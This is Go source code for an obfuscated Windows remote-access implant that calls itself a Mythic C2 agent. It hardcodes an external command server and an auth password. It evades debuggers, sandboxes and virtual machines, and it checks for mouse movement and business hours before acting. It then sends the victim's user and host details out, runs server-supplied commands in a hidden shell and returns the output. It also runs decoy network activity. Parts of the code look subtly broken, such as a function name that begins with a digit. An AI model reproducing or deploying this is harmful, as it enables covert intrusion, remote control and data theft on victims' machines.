package main

import (
        "bytes"
        "crypto/aes"
        "crypto/cipher"
        "crypto/rand"
        "crypto/tls"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io"
        "net/http"
        "os"
        "os/exec"
        "runtime"
        "strconv"
        "strings"
        "syscall"
        "time"
        "unsafe"
)

// Configurações ofuscadas
const (
        cPFDt4SSeO0lCheckinDataURL = "https://37.27.249.191:7443"
        cPFDt4SSeO0lCheckinDataPWD = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
        wBE4vH2z5vResponseDataUA  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/wiJ/uL3aLVDB Safari/537.36"
        MZSGXL4lRIfIrEnWServiceMTX  = "Global\Nlz69GPWphADlrq5d3fdMm2RNHDHOhyB"
)

var (
        k32 = syscall.NewLazyDLL("kernel32.dll")
        u32 = syscall.NewLazyDLL("user32.dll")
        
        pIsDebuggerPresent   = k32.NewProc("IsDebuggerPresent")
        pGetCursorPos        = u32.NewProc("GetCursorPos")
        pGetTickCount        = k32.NewProc("GetTickCount")
        pCreateMutexW        = k32.NewProc("CreateMutexW")
        pGetSystemMetrics    = u32.NewProc("GetSystemMetrics")
        pGetModuleHandleW    = k32.NewProc("GetModuleHandleW")
        pGetProcAddress      = k32.NewProc("GetProcAddress")
)

type cPFDt4SSeO0lCheckinData struct {
        Action    string                 `json:"action"`
        UUID      string                 `json:"uuid"`
        User      string                 `json:"user"`
        Host      string                 `json:"host"`
        PID       int                    `json:"pid"`
        OS        string                 `json:"os"`
        Timestamp string                 `json:"timestamp"`
        IPs       []string               `json:"ips"`
        Payload   map[string]interface{} `json:"payload_os"`
}

type wBE4vH2z5vResponseData struct {
        Action     string `json:"action"`
        TaskID     string `json:"task_id"`
        UserOutput string `json:"user_output"`
        Completed  bool   `json:"completed"`
}

type MZSGXL4lRIfIrEnWServicePoint struct {
        X, Y int32
}

// Função de detecção de ambiente hostil
func L8PrWXIS3HclgDKDDetectThreats() bool {
        if runtime.GOOS != "windows" {
                return false
        }
        
        // Anti-debugging avançado
        ret, _, _ := pIsDebuggerPresent.Call()
        if ret != 0 {
                return true
        }
        
        // Verificar processos de análise
        hostileProcesses := []string{
                "ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
                "regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
                "sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
        }
        
        for _, proc := range hostileProcesses {
                cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
                if output, err := cmd.Output(); err == nil {
                        if strings.Contains(strings.ToLower(string(output)), proc) {
                                return true
                        }
                }
        }
        
        // Verificar fabricante via WMI
        cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
        if output, err := cmd.Output(); err == nil {
                manufacturer := strings.ToLower(string(output))
                vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation", "innotek"}
                for _, vm := range vmStrings {
                        if strings.Contains(manufacturer, vm) {
                                return true
                        }
                }
        }
        
        // Verificar resolução de tela (sandboxes têm resoluções baixas)
        width, _, _ := pGetSystemMetrics.Call(0)  // SM_CXSCREEN
        height, _, _ := pGetSystemMetrics.Call(1) // SM_CYSCREEN
        if width < 1024 || height < 768 {
                return true
        }
        
        return false
}

// Verificação de atividade do usuário
func J9uZDIDuQ9JejH2nd4CheckUserActivity() bool {
        var pos1, pos2 MZSGXL4lRIfIrEnWServicePoint
        
        // Primeira posição
        pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
        time.Sleep(150 * time.Millisecond)
        
        // Segunda posição
        pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
        
        // Se o mouse não se moveu, pode ser sandbox
        if pos1.X == pos2.X && pos1.Y == pos2.Y {
                time.Sleep(2 * time.Second)
                
                // Terceira verificação
                var pos3 MZSGXL4lRIfIrEnWServicePoint
                pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos3)))
                
                return pos2.X != pos3.X || pos2.Y != pos3.Y
        }
        
        return true
}

// Validação de horário comercial
func J8NNq3VkirSJ4Sp6axkdValidateEnvironment() bool {
        now := time.Now()
        hour := now.Hour()
        weekday := now.Weekday()
        
        // Só funciona em dias úteis, horário comercial
        if weekday == time.Saturday || weekday == time.Sunday {
                return false
        }
        
        return hour >= 9 && hour <= 17
}

// Registro inicial no C2
func 9q0XNr6DqgZKydRegisterAgent() error {
        hostname, _ := os.Hostname()
        uuid := fmt.Sprintf("%d-%s", time.Now().Unix(), hostname)
        
        payload := cPFDt4SSeO0lCheckinData{
                Action:    "checkin",
                UUID:      uuid,
                User:      os.Getenv("USERNAME"),
                Host:      hostname,
                PID:       os.Getpid(),
                OS:        runtime.GOOS,
                Timestamp: time.Now().Format(time.RFC3339),
                IPs:       []string{"127.0.0.1"},
                Payload: map[string]interface{}{
                        "os": runtime.GOOS,
                        "arch": runtime.GOARCH,
                },
        }
        
        jsonData, err := json.Marshal(payload)
        if err != nil {
                return err
        }
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("POST", cPFDt4SSeO0lCheckinDataURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
        if err != nil {
                return err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", wBE4vH2z5vResponseDataUA)
        req.Header.Set("Mythic", cPFDt4SSeO0lCheckinDataPWD)
        
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        
        return nil
}

// Buscar tarefas do C2
func RLmkcP4yhwbewgjDRetrieveTasks() ([]map[string]interface{}, error) {
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("GET", cPFDt4SSeO0lCheckinDataURL+"/api/v1.4/agent_message", nil)
        if err != nil {
                return nil, err
        }
        
        req.Header.Set("User-Agent", wBE4vH2z5vResponseDataUA)
        req.Header.Set("Mythic", cPFDt4SSeO0lCheckinDataPWD)
        
        resp, err := client.Do(req)
        if err != nil {
                return nil, err
        }
        defer resp.Body.Close()
        
        body, err := io.ReadAll(resp.Body)
        if err != nil {
                return nil, err
        }
        
        var tasks []map[string]interface{}
        json.Unmarshal(body, &tasks)
        
        return tasks, nil
}

// Executar comando
func WuM2Bbbl82ZNeorBCBExecuteCommand(command string) string {
        var cmd *exec.Cmd
        
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/c", command)
        } else {
                cmd = exec.Command("sh", "-c", command)
        }
        
        // Configurar processo para não mostrar janela
        if runtime.GOOS == "windows" {
                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        }
        
        output, err := cmd.Output()
        if err != nil {
                return fmt.Sprintf("Error: %s", err.Error())
        }
        
        return string(output)
}

// Enviar resultado para C2
func i9hwlFSP6h8k7GN1c5AVTransmitResults(taskID, output string) error {
        response := wBE4vH2z5vResponseData{
                Action:     "post_response",
                TaskID:     taskID,
                UserOutput: base64.StdEncoding.EncodeToString([]byte(output)),
                Completed:  true,
        }
        
        jsonData, err := json.Marshal(response)
        if err != nil {
                return err
        }
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("POST", cPFDt4SSeO0lCheckinDataURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
        if err != nil {
                return err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", wBE4vH2z5vResponseDataUA)
        req.Header.Set("Mythic", cPFDt4SSeO0lCheckinDataPWD)
        
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        
        return nil
}

// Atividades para manter legitimidade
func UDcxO6XYq1jzM04HE27iG4MaintainLegitimacy() {
        go func() {
                for {
                        // Sleep variável entre 5-15 minutos
                        sleepTime := time.Duration(300+rand.Int63n(600)) * time.Second
                        time.Sleep(sleepTime)
                        
                        // Atividades legítimas do sistema
                        activities := []func(){
                                func() { exec.Command("nslookup", "microsoft.com").Run() },
                                func() { exec.Command("ping", "-n", "1", "8.8.8.8").Run() },
                                func() { exec.Command("ipconfig", "/release").Run(); exec.Command("ipconfig", "/renew").Run() },
                                func() {
                                        if f, err := os.Create(os.TempDir() + "\temp_" + strconv.Itoa(int(time.Now().Unix())) + ".tmp"); err == nil {
                                                f.Write([]byte("temporary system data"))
                                                f.Close()
                                                time.Sleep(5 * time.Second)
                                                os.Remove(f.Name())
                                        }
                                },
                        }
                        
                        // Executar atividade aleatória
                        if len(activities) > 0 {
                                activities[rand.Int63n(int64(len(activities)))]()
                        }
                }
        }()
}

func main() {
        // Verificações de evasão críticas
        if L8PrWXIS3HclgDKDDetectThreats() {
                os.Exit(0)
        }
        
        // Verificar atividade do usuário
        if !J9uZDIDuQ9JejH2nd4CheckUserActivity() {
                time.Sleep(10 * time.Second)
                if !J9uZDIDuQ9JejH2nd4CheckUserActivity() {
                        os.Exit(0)
                }
        }
        
        // Verificar horário comercial
        if !J8NNq3VkirSJ4Sp6axkdValidateEnvironment() {
                // Calcular próximo horário comercial
                now := time.Now()
                nextBusiness := now
                
                for nextBusiness.Weekday() == time.Saturday || 
                        nextBusiness.Weekday() == time.Sunday || 
                        nextBusiness.Hour() < 9 || 
                        nextBusiness.Hour() >= 17 {
                        nextBusiness = nextBusiness.Add(1 * time.Hour)
                }
                
                time.Sleep(nextBusiness.Sub(now))
        }
        
        // Criar mutex para instância única
        mutexName, _ := syscall.UTF16PtrFromString(MZSGXL4lRIfIrEnWServiceMTX)
        mutex, _, _ := pCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(mutexName)))
        if mutex == 0 {
                os.Exit(0)
        }
        
        // Iniciar atividades de legitimidade
        UDcxO6XYq1jzM04HE27iG4MaintainLegitimacy()
        
        // Registro inicial
        err := 9q0XNr6DqgZKydRegisterAgent()
        if err != nil {
                time.Sleep(60 * time.Second)
                os.Exit(0)
        }
        
        // Loop principal
        for {
                tasks, err := RLmkcP4yhwbewgjDRetrieveTasks()
                if err == nil && len(tasks) > 0 {
                        for _, task := range tasks {
                                if taskID, ok := task["id"].(string); ok {
                                        if command, ok := task["command"].(string); ok {
                                                output := WuM2Bbbl82ZNeorBCBExecuteCommand(command)
                                                i9hwlFSP6h8k7GN1c5AVTransmitResults(taskID, output)
                                        }
                                }
                        }
                }
                
                // Jitter inteligente baseado em horário
                now := time.Now()
                var jitter time.Duration
                
                if now.Hour() >= 9 && now.Hour() <= 17 {
                        // Horário comercial: mais ativo
                        jitter = time.Duration(3+rand.Int63n(7)) * time.Second
                } else {
                        // Fora do horário: menos ativo
                        jitter = time.Duration(10+rand.Int63n(20)) * time.Second
                }
                
                time.Sleep(jitter)
        }
}
